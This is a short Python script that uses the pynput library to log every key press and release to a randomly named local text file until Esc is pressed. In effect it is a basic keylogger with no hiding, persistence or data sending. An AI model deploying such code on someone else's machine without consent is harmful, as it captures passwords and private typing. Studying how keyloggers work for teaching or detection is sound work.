from random import randint
from pynput.keyboard import Key, Listener


output = 'kld' + str(randint(0, 10000)) + '.txt'

with open(output, 'w') as f:
    f.close()


def on_press(key):
    with open(output, 'a') as f:
        f.write('{0} pressed\n'.format(key))
        f.close()


def on_release(key):
    with open(output, 'a') as f:
        f.write('{0} released\n'.format(key))
        f.close()
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
